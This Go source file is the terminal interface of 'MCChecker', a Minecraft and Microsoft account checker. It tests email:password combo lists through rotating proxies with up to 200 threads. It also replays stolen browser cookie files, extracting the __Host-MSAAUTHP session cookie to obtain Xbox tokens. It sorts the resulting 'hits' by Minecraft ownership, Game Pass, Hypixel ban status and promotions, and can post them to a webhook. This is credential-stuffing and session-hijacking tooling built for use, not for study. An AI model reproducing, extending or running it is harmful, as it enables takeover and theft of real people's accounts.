//go:build terminal

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func main() {
	exe, _ := os.Executable()
	os.Chdir(filepath.Dir(exe))

	IsTerminal = true
	OnLog = func(level LogLevel, msg string) {
		fmt.Printf("\n  %s", msg)
	}
	OnProgress = func(stats ProgressStats) {
		total := stats.TotalChecked + stats.CookieTotal
		elapsed := stats.ElapsedSeconds
		if elapsed < 1 {
			elapsed = 1
		}
		cps := float64(total) / elapsed
		fmt.Printf("\r  [MC: %d] [XGPU: %d] [RP: %d] [Val: %d] [HB:%d/%d] [Cook: %d/%d] [Total: %d] [%.0f CPM] [%.1f/s]   ",
			stats.MCHits, stats.XGPUHits, stats.RPHits, stats.ValidCount,
			stats.HypixelBanned, stats.HypixelUnban, stats.CookieValid, stats.CookieInvalid,
			total, stats.CPM, cps)
	}
	OnComplete = func(summary CheckSummary) {
		fmt.Printf("\n\n")
		fmt.Println(green("  ────────────── CHECK COMPLETE ──────────────"))
		fmt.Printf("\n")
		fmt.Println(white(fmt.Sprintf("  Accounts Checked: %d", summary.TotalChecked)))
		fmt.Println(white(fmt.Sprintf("  Valid Accounts:  %d", summary.ValidCount)))
		fmt.Println(white(fmt.Sprintf("  Invalid:         %d", atomic.LoadInt64(&invalidCount))))
		fmt.Println(white(fmt.Sprintf("  Locked:          %d", atomic.LoadInt64(&lockedCount))))
		fmt.Println(white(fmt.Sprintf("  MC Hits:         %d", summary.MCHits)))
		fmt.Println(white(fmt.Sprintf("  XGPU Hits:       %d", summary.XGPUHits)))
		fmt.Println(white(fmt.Sprintf("  RP Hits:         %d", summary.RPHits)))
		fmt.Println("")
		fmt.Println(white(fmt.Sprintf("  Cookies Checked: %d", summary.CookieTotal)))
		fmt.Println(white(fmt.Sprintf("  Cookies Valid:   %d", summary.CookieValid)))
		fmt.Println(white(fmt.Sprintf("  Cookies Invalid: %d", summary.CookieInvalid)))
		fmt.Println("")
		fmt.Println(white(fmt.Sprintf("  Time Elapsed:    %s", time.Duration(summary.ElapsedSeconds*float64(time.Second)).Round(time.Second))))
		fmt.Println(white(fmt.Sprintf("  Average CPM:     %.0f", summary.CPM)))
		fmt.Println("")
		fmt.Println(white(fmt.Sprintf("  Hypixel Banned:  %d", summary.HypixelBanned)))
		fmt.Println(white(fmt.Sprintf("  Hypixel Unban:   %d", summary.HypixelUnban)))
		fmt.Println(green("\n  ────────────────────────────────────────────"))
	}

	runSetup()
	console := NewConsole()
	for {
		console.Clear()
		printBanner(console)
		console.SetTitle("MCChecker v1.0 — Main Menu")
		console.Println("")
		console.Println(cyan("  ┌──────────────────────────────────────────┐"))
		console.Println(cyan("  │") + white("            M C C H E C K E R            ") + cyan("│"))
		console.Println(cyan("  ├──────────────────────────────────────────┤"))
		console.Println(cyan("  │") + yellow("  1.") + white(" Start Checking                    ") + cyan("│"))
		console.Println(cyan("  │") + yellow("  2.") + white(" Config                            ") + cyan("│"))
		console.Println(cyan("  │") + yellow("  3.") + white(" Credits                           ") + cyan("│"))
		console.Println(cyan("  │") + yellow("  4.") + white(" Exit                              ") + cyan("│"))
		console.Println(cyan("  └──────────────────────────────────────────┘"))
		console.Println("")

		choice := console.Prompt(cyan("  [?]") + white(" Select an option: "))

		switch choice {
		case "1":
			runTerminalChecker(console)
		case "2":
			showConfig(console)
		case "3":
			showCredits(console)
		case "4":
			console.Println(yellow("  Goodbye."))
			console.Println(gray("  Press Enter to exit..."))
			console.ReadLine()
			return
		default:
			console.Println(red("  Invalid option. Press Enter to continue..."))
			console.ReadLine()
		}
	}
}

func runTerminalChecker(console *Console) {
	console.Clear()
	printBanner(console)
	console.SetTitle("MCChecker — Checking")

	cfg, err := loadConfig("config.json")
	if err != nil {
		console.Println(red("  [ERROR] Failed to load config.json: " + err.Error()))
		console.Println(gray("  Press Enter to return..."))
		console.ReadLine()
		return
	}

	currentRunDir = getNextRunDir()
	os.MkdirAll(filepath.Join(currentRunDir, "minecraft", "all_mc_hits"), 0755)
	os.MkdirAll(filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "banned"), 0755)
	os.MkdirAll(filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "unbanned"), 0755)
	console.Println(green(fmt.Sprintf("  [✓] Run folder: %s", currentRunDir)))

	var combos []string
	if _, err := os.Stat("combos.txt"); err == nil {
		combos, err = loadFile("combos.txt")
		if err != nil {
			console.Println(red("  [ERROR] Failed to read combos.txt"))
		} else {
			combos = removeDuplicates(combos)
			console.Println(green(fmt.Sprintf("  [✓] Loaded %d unique combos", len(combos))))
		}
	}

	var cookieFiles []string
	if cfg.CookieCheck {
		cookiePath := cfg.CookiePath
		if cookiePath == "" {
			cookiePath = "cookies"
		}
		if _, err := os.Stat(cookiePath); err == nil {
			filepath.Walk(cookiePath, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if !info.IsDir() && strings.HasSuffix(info.Name(), ".txt") {
					cookieFiles = append(cookieFiles, path)
				}
				return nil
			})
			console.Println(green(fmt.Sprintf("  [✓] Loaded %d cookie files", len(cookieFiles))))
		}
	}

	var proxies []string
	if cfg.ProxyMode != "" {
		proxies, _ = loadFile("proxies.txt")
		if len(proxies) > 0 {
			console.Println(green(fmt.Sprintf("  [✓] Loaded %d proxies", len(proxies))))
		}
	}

	totalWork := len(combos) + len(cookieFiles)
	if totalWork == 0 {
		console.Println(red("  [X] Nothing to check. Provide combos.txt or enable cookie_check in config."))
		console.Println(gray("  Press Enter to return..."))
		console.ReadLine()
		return
	}

	console.Println("")
	console.Println(cyan("  ────────────────────────────────────────────"))
	threadStr := console.Prompt(cyan("  [?]") + white(" Threads (default 50): "))
	threads := 50
	if threadStr != "" {
		fmt.Sscanf(threadStr, "%d", &threads)
		if threads < 1 {
			threads = 1
		}
		if threads > 200 {
			threads = 200
		}
	}
	console.Println(cyan("  ────────────────────────────────────────────"))

	console.Clear()
	printBanner(console)
	console.Println(green("  Checking in progress... Press Ctrl+C to stop.\n"))

	startTime := time.Now()

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, combo := range combos {
		parts := strings.SplitN(combo, ":", 2)
		if len(parts) != 2 {
			continue
		}
		email := parts[0]
		password := parts[1]

		sem <- struct{}{}
		wg.Add(1)
		go func(email, password string) {
			defer wg.Done()
			defer func() { <-sem }()
			proxyURL := pickProxy(proxies, cfg.ProxyMode)
			checkAccount(email, password, proxyURL, cfg)
			if OnProgress != nil {
				OnProgress(collectStats())
			}
		}(email, password)
	}

	msChan := make(chan cookieXboxResult, 200)
	var stage1Wg sync.WaitGroup
	for _, cf := range cookieFiles {
		stage1Wg.Add(1)
		go func(cf string) {
			defer stage1Wg.Done()
			proxyURL := pickProxy(proxies, cfg.ProxyMode)
			client := buildHTTPClient(proxyURL)

			atomic.AddInt64(&cookieTotal, 1)
			cookies, rawLines, err := parseCookieFile(cf)
			if err != nil {
				ce := categorizeCookieError(fmt.Errorf("parse error: %w", err))
				atomic.AddInt64(&cookieInvalid, 1)
				safeWrite("cookie_errors.log", fmt.Sprintf("[PARSE] %s | %s | %s", cf, ce.Category, ce.Detail))
				logErrorLine("[PARSE_ERR] %s | %s", cf, ce.Detail)
				return
			}

			msauthCookie, ok := cookies["__Host-MSAAUTHP"]
			if !ok {
				atomic.AddInt64(&cookieInvalid, 1)
				safeWrite("cookie_errors.log", fmt.Sprintf("[MISSING] %s | No __Host-MSAAUTHP cookie found", cf))
				logErrorLine("[MISSING] %s | no __Host-MSAAUTHP cookie", cf)
				return
			}

			uhs, bearer, err := cookieXboxAuth(client, msauthCookie)
			if err != nil {
				ce := categorizeCookieError(err)
				atomic.AddInt64(&cookieInvalid, 1)
				ll := fmt.Sprintf("[%s] %s | %s", ce.Category, cf, ce.Detail)
				safeWrite("cookie_errors.log", ll)
				switch ce.Category {
				case "EXPIRED", "AUTH_FAILED", "MC_REJECTED":
					safeWrite("cookie_invalid.txt", fmt.Sprintf("%s | %s: %s", cf, ce.Category, ce.Message))
					logErrorLine("[%s] %s | %s", ce.Category, cf, ce.Message)
				case "TIMEOUT", "NETWORK":
					safeWrite("cookie_network_errors.log", ll)
					logLine("[%s] %s", ce.Category, cf)
				case "RATE_LIMITED":
					safeWrite("cookie_rate_limited.log", ll)
					logLine("[RATE_LIMITED] %s", cf)
				default:
					safeWrite("cookie_unknown_errors.log", ll)
					logErrorLine("[COOKIE_ERR] %s | %s", cf, ce.Message)
				}
				return
			}

			msChan <- cookieXboxResult{client: client, cookieFile: cf, rawLines: rawLines, uhs: uhs, bearer: bearer}
		}(cf)
		time.Sleep(50 * time.Millisecond)
	}

	go func() {
		stage1Wg.Wait()
		close(msChan)
	}()

	var stage2Wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		stage2Wg.Add(1)
		go func() {
			defer stage2Wg.Done()
			for data := range msChan {
				processCookieStage2(data, cfg)
			}
		}()
	}
	stage2Wg.Wait()

	wg.Wait()

	closeAllFiles()

	elapsedSecs := time.Since(startTime).Seconds()
	cpm := float64(0)
	if elapsedSecs > 0 {
		totalDone := float64(atomic.LoadInt64(&totalChecked) + atomic.LoadInt64(&cookieTotal))
		cpm = totalDone / elapsedSecs * 60
	}

	OnComplete(CheckSummary{
		ProgressStats: ProgressStats{
			TotalChecked:   atomic.LoadInt64(&totalChecked),
			MCHits:         atomic.LoadInt64(&mcHits),
			XGPUHits:       atomic.LoadInt64(&xgpuHits),
			RPHits:         atomic.LoadInt64(&rpHits),
			ValidCount:     atomic.LoadInt64(&validCount),
			HypixelBanned:  atomic.LoadInt64(&hypixelBanned),
			HypixelUnban:   atomic.LoadInt64(&hypixelUnban),
			CookieValid:    atomic.LoadInt64(&cookieValid),
			CookieInvalid:  atomic.LoadInt64(&cookieInvalid),
			CookieTotal:    atomic.LoadInt64(&cookieTotal),
			ElapsedSeconds: elapsedSecs,
			CPM:            cpm,
		},
		TotalCombos:  len(combos),
		TotalCookies: len(cookieFiles),
		RunDir:       currentRunDir,
	})

	console.Println(gray("\n  Press Enter to return to menu..."))
	console.ReadLine()
}

func showConfig(console *Console) {
	console.Clear()
	printBanner(console)
	console.SetTitle("MCChecker — Config")

	cfg, err := loadConfig("config.json")
	if err != nil {
		console.Println(red("  [ERROR] config.json not found"))
		console.Println(gray("  Press Enter to return..."))
		console.ReadLine()
		return
	}

	console.Println(cyan("\n  ────────────── CONFIGURATION ──────────────\n"))
	console.Println(white(fmt.Sprintf("  Cookie Check:    %s", boolColor(cfg.CookieCheck))))
	console.Println(white(fmt.Sprintf("  Cookie Path:     %s", valOr(cfg.CookiePath, "cookies/"))))
	console.Println(white(fmt.Sprintf("  Hypixel Check:   %s", boolColor(cfg.HypixelCheck))))
	console.Println(white(fmt.Sprintf("  MS Rewards:      %s", boolColor(cfg.MSRewards))))
	console.Println(white(fmt.Sprintf("  Xbox Perks:      %s", boolColor(cfg.XboxPerks))))
	console.Println(white(fmt.Sprintf("  Nitro Promo:     %s", boolColor(cfg.NitroPromo))))
	console.Println(white(fmt.Sprintf("  Proxy Mode:      %s", valOr(cfg.ProxyMode, "none"))))
	console.Println(white(fmt.Sprintf("  Retry on Rate:   %s", boolColor(cfg.RetryRateLimited))))
	console.Println(white(fmt.Sprintf("  Sniper:          %s", boolColor(cfg.Sniper))))
	console.Println(white(fmt.Sprintf("  Gamepass PC:     %s", boolColor(cfg.GamepassPC))))
	console.Println(white(fmt.Sprintf("  Gamepass Ult:    %s", boolColor(cfg.GamepassUltimate))))
	console.Println(white(fmt.Sprintf("  Webhook:         %s", cfg.Webhook)))
	console.Println(cyan("\n  ────────────────────────────────────────────"))
	console.Println(gray("\n  Press Enter to return..."))
	console.ReadLine()
}

func showCredits(console *Console) {
	console.Clear()
	printBanner(console)
	console.SetTitle("MCChecker — Credits")
	console.Println(cyan("\n  ──────────────── CREDITS ────────────────\n"))
	console.Println(white("  MCChecker v1.0"))
	console.Println(white("  Minecraft Account + Cookie Checker"))
	console.Println("")
	console.Println(white("  Based on ShulkerV2 (reconstructed source)"))
	console.Println(white("  Cookie auth adapted from @BINARY_THUG"))
	console.Println(cyan("\n  ────────────────────────────────────────────"))
	console.Println(gray("\n  Press Enter to return..."))
	console.ReadLine()
}

func printBanner(c *Console) {
	banner := `
 ██████╗ ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗
██╔════╝██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
` + "                        " + Version + "\n"
	c.Println(cyan(banner))
}

func boolColor(b bool) string {
	if b {
		return green("Enabled")
	}
	return red("Disabled")
}

func cyan(s string) string  { return "\033[36m" + s + "\033[0m" }
func green(s string) string { return "\033[32m" + s + "\033[0m" }
func yellow(s string) string { return "\033[33m" + s + "\033[0m" }
func red(s string) string   { return "\033[31m" + s + "\033[0m" }
func white(s string) string { return "\033[37m" + s + "\033[0m" }
func gray(s string) string  { return "\033[90m" + s + "\033[0m" }
